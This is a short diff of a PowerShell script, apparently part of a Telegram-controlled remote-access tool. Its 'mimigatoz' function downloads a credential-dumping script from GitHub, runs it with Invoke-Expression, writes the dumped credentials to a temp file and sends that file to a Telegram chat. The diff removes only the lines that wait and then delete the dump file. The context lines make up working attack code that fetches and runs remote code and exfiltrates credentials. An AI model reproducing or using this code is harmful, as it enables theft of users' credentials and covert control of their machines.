@@ -169,8 +169,6 @@ function mimigatoz {
 $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta = $ruta + "\mimigatoz.txt"
 $mimigatoz = (curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content ; IEX $mimigatoz -dumpcred | Out-File  $ruta
 bot-send -file $ruta -botkey $botkey -chat_id $chat_id
-sleep -Seconds 5
-Remove-Item $ruta
 }
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
